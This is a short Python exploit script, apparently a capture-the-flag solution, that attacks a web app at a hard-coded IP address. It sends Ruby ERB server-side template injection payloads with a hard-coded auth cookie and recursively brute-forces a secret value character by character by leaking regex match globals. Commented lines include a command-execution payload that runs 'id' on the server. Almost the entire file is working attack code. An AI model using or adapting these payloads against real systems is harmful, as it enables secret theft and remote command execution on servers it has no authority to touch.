#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/06/23, 13:06
"""

import requests as req

URL = 'http://47.110.15.101/work'


def fuck(payload, ext="", s=""):
    data = {
        "SECRET": s,
        "name": payload+ext,
        "do": "%s is working" % payload
    }
    cookie = {
        'auth': 'eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI0OTVhZWMw' +
        'Yy1iYjVkLTRlMDYtYWVhZS1kZTExN2QxMzgyZjMiLCJqa2wiOj' +
        'IwNn0.bJnZIM0pcN_knNowSlleHDX-8knYxzI3YV6G45aq0nA'
    }
    res = req.get(URL, params=data, cookies=cookie)
    if 'successfully' in res.text and s in res.text:
        print(res.text)
        return s


def ddd(a):
    prefix = a
    s = []
    for a in '1234567890abcdef':
        r = fuck("<%=$&%>", "", a+prefix)
        if r:
            s.append(r)
    for i in s:
        ddd(i)


# ec55ce17b51f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8
if __name__ == '__main__':
    # j p
    # $0 ./app/app.rb
    # $< ARGF
    # $> #<IO:0x0055e9bb809b20>
    # fuck("[\"<%=123%>\", 1, 2, 3, 4, 5, 6]", "", "1")
    # fuck("%2", "<%=`id`%>")
    sec = ''
    ddd("1f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8")
    # for a in '1234567890abcdef':
    #     fuck("<%=$&%>", "", "1"+a)
    # 17b
    # 21e
    # 3d
    # a4882fe4875c
    # for i in '1234567890abcdef':
    #     sec = i
    #     for a in '1234567890abcdef':  # ghijklmnopqrstuvwxyz':
    #         r = fuck("<%=$&%>", "", sec+a)
    #         if r:
    #             sec = r
    #     print("[+] SECRET = %s" % sec)
    # for a in '1234567890qwertyuiopasdfghjklzxcvbnm':
    #     for b in '1234567890qwertyuiopasdfghjklzxcvbnm':
    #         if fuck("<%={}{}%>".format(a, b)):
    #             print(a, b)
